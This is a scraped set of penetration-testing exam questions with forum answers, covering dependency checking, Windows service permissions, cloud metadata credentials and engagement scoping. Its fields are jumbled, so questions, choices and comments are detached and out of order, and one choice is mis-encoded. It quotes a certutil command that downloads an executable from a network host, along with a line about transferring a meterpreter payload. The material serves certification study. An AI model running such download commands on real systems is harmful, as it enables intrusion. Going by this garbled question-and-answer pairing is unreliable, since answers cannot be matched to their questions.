choices.D: Perform fuzz testing of compiled binaries.
choices.A: Add a dependency checker into the tool chain.
choices.B: Perform routine static and dynamic analysis of committed code.
choices.C: Validate API security settings before deployment.

questions.question_text: A penetration tester has completed an analysis of the various software products produced by the company under assessment. The tester found that over the past several years the company has been including vulnerable third-party modules in multiple products, even though the quality of the organic code being developed is very good. Which of the following recommendations should the penetration tester include in the report?

discussion.content:
I think answer is A here 
https://owasp.org/www-project-dependency-check/#:~:text=Dependency%2DCheck%20is%20a%20Software,identifier%20for%20a%20given%20dependency.
I will take B for this one.

comments.content: With you on that, the other answers don't make any sense.

discussion.content:
Selected Answer: A
Read the owasp.org article by @Adonist it seems to line up directly with what they are talking about. I'm going with A, they need to run a dependency checker. The question states, that the organic code is good, and it seems to be live, so there shouldn't be any static testing going on, and probably not dynamic testing unless needed. The better thing to do would be to run a SDC for known CVEs so that those can be spearheaded & not repeat the whole coding process. just my thoughts.

Selected Answer: A
Regarding Static Code Analysis:
https://whatis.techtarget.com/definition/static-analysis-static-code-analysis
"Generally, static analysis occurs before software testing in early development."

Since our question says "committed code", how can you do a static analysis of committed code? 
https://www.argon.io/blog/how-to-analyze-the-owasp-dependency-check/
Which makes A the correct answer.

choices.C: schtasks /query /fo LIST /v | find /I ג€Next Run Time:ג€

discussion.content:
Selected Answer: A
Inviato da Copilot:
The correct answer is A. certutil -urlcache -split -f http://192.168.2.124/windows-binaries/accesschk64.exe.

The certutil -urlcache -split -f command in Windows is used to download files from a specified URL. In this case, it’s being used to download the accesschk64.exe file from the provided URL. accesschk64.exe is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This can be useful for a penetration tester to identify misconfigured service permissions.

Please note that this is a potentially dangerous operation and should only be performed in a controlled and legal testing environment. Unauthorized penetration testing can be illegal and unethical. Always obtain proper authorization before conducting any penetration testing activities.

Selected Answer: A
Option A is using the "certutil" command to download and save the AccessChk tool on the target machine. AccessChk can be used to check the permissions of services and other objects on the Windows system, and can help identify misconfigured permissions that may be exploited by an attacker.

Option B is using a PowerShell command to upload a file to a remote server, which is not relevant to the task at hand.

Option C is using the "schtasks" command to display information about scheduled tasks, which is also not relevant to the task at hand.

Option D is using the "wget" command to download the AccessChk tool, which is similar to option A but is using a different command. However, "wget" is not a native Windows command and may not be available on the target system, whereas "certutil" is a native Windows command that should be available on most Windows systems.

Good info here from SentinalOne on how attackers can use Certutil.exe - CertUtil.exe is an admin command line tool intended by Microsoft to be used for manipulating certification authority (CA) data and components. This includes verifying certificates and certificate chains, dumping and displaying CA configuration information and configuring Certificate Services. 
How Attackers Use CertUtil
CertUtil can replace PowerShell for specific tasks such as downloading a file from a remote URL and encoding and decoding a Base64 obfuscated payload. Note the -urlcache verb that can be employed for this purpose: 
See link: https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/

Selected Answer: A
This one is tough. My best guess is the Certutil as it is a known service vulnerability in which a standard user can capitalize on write permissions to a root/system level access and replace the file/executable with a malicious link. @luca76cap has a good answer. I read a bunch of articles, but this one helped the most: https://outrunsec.com/tag/certutil/

"Now we will transfer the meterpreter payload using Certutil. This is a built-in utility included on most Windows operating systems and my go-to tool for windows file transfers."

A penetration tester has obtained a low-privilege shell on a Windows server with a DEFAULT CONFIGURATION and now wants to explore the ability to exploit MISCONFIGURED SERVICE PERMISSIONS. Which of the following commands would help the tester START this process?

questions.question_text: A penetration tester has obtained a low-privilege shell on a Windows server with a default configuration and now wants to explore the ability to exploit misconfigured service permissions. Which of the following commands would help the tester START this process?

A penetration tester is testing a web application that is hosted by a public cloud provider. The tester is able to query the provider's metadata and get the credentials used by the instance to authenticate itself. Which of the following vulnerabilities has the tester exploited?

discussion.content:
Selected Answer: B
I think the given answer is correct (B).
option A is used against USER.
option B is used against server.
I agree with the answer, but lol, to have a proper scope you need to know what you're hitting and if its a third party network, you need permission from them. just my two cents. Answer A.

Selected Answer: A
The statement of work (SOW) is a crucial document that outlines the scope, objectives, and deliverables of the engagement. It provides clear guidelines and expectations for both the penetration testing team and the client. Clarifying the SOW ensures that there is a mutual understanding of the goals, limitations, and requirements of the engagement, which is essential for conducting a successful penetration test.

Selected Answer: A
I agree with the answer, too

questions.question_text: When preparing for an engagement with an enterprise organization, which of the following is one of the MOST important items to develop fully prior to beginning the penetration testing activities?

choices.B: Obtain an asset inventory from the client.

choices.D: Halt the assessment and follow the reporting procedures as outlined in the contract.
choices.C: Create a detailed document of findings before continuing with the assessment.
choices.B: Incorporate the newly identified method of compromise into the red team's approach.
choices.A: Perform forensic analysis to isolate the means of compromise and determine attribution.

discussion.content:
Selected Answer: D
D is the ryt answer

Selected Answer: D
If an IoC is found, the assessment should be stopped immediately

Selected Answer: D
When conducting a red team assessment, it is crucial to adhere to the scope and rules of engagement set forth in the contract or agreement. If the tester discovers an artifact that suggests possible prior compromise, it raises concerns about the integrity of the assessment and the potential impact on the target environment. In such cases, it is essential to prioritize the security and well-being of the client's systems and data.
By halting the assessment and following the reporting procedures outlined in the contract, the red-team tester ensures that the appropriate stakeholders within the organization are promptly informed of the potential compromise. This allows for a thorough investigation, remediation, and any necessary actions to address the identified security issues.

questions.question_text: A red-team tester has been contracted to emulate the threat posed by a malicious insider on a company's network, with the constrained objective of gaining access to sensitive personnel files. During the assessment, the red-team tester identifies an artifact indicating possible prior compromise within the target environment. Which of the following actions should the tester take?
